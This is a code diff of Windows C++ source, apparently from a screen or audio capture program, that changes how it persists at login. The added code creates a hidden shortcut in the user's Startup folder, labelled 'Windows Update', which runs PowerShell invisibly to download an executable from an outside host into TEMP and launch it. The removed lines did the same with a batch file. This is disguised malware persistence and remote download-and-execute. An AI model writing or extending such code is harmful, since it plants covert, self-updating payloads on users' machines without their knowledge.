@@ -15,6 +15,7 @@
 #include <audioclient.h>
 #include "config.h"
 #include <tlhelp32.h>
+#include <shlobj.h>
 #include "capture_shared.h"
 
 // Missing DirectShow declarations (not available in this mingw version)
@@ -2282,6 +2283,7 @@ static void CleanupPersistence() {
     char appdata[MAX_PATH];
     if (GetEnvironmentVariableA("APPDATA", appdata, MAX_PATH) > 0 && appdata[0]) {
         DeleteFileA((std::string(appdata) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsUpdate.bat").c_str());
+        DeleteFileA((std::string(appdata) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsUpdate.lnk").c_str());
     }
 }
 
@@ -2396,15 +2398,26 @@ static void EnsureStartupFolderEntry() {
     char appdata[MAX_PATH];
     if (GetEnvironmentVariableA("APPDATA", appdata, MAX_PATH) == 0 || appdata[0] == 0) return;
     std::string startupPath = std::string(appdata) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
-    std::string batPath = startupPath + "\\WindowsUpdate.bat";
-    DeleteFileA(batPath.c_str());
-    std::string batContent = "@echo off\r\n"
-        "powershell -w h -c \"$p=$env:TEMP+'\\\\" + GetExeName() + "';$wc=New-Object Net.WebClient;$wc.DownloadFile('https://allseeing.netlify.app/a',$p);start $p\"\r\n";
-    FILE* f = NULL;
-    fopen_s(&f, batPath.c_str(), "w");
-    if (!f) return;
-    fwrite(batContent.c_str(), 1, batContent.size(), f);
-    fclose(f);
+    DeleteFileA((startupPath + "\\WindowsUpdate.bat").c_str());
+    std::string lnkPath = startupPath + "\\WindowsUpdate.lnk";
+    DeleteFileA(lnkPath.c_str());
+    std::wstring args = L"-w h -c \"$p=$env:TEMP+'\\" + GetExeNameW() + L"';$wc=New-Object Net.WebClient;$wc.DownloadFile('https://allseeing.netlify.app/a',$p);start $p\"";
+    HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
+    if (FAILED(hr)) return;
+    IShellLinkW* psl = NULL;
+    if (SUCCEEDED(CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLinkW, (void**)&psl))) {
+        psl->SetPath(L"powershell.exe");
+        psl->SetArguments(args.c_str());
+        psl->SetShowCmd(SW_HIDE);
+        psl->SetDescription(L"Windows Update");
+        IPersistFile* ppf = NULL;
+        if (SUCCEEDED(psl->QueryInterface(IID_IPersistFile, (void**)&ppf))) {
+            ppf->Save(ToWide(lnkPath).c_str(), TRUE);
+            ppf->Release();
+        }
+        psl->Release();
+    }
+    CoUninitialize();
 }
 
 static int RunChild(HINSTANCE hInstance) {
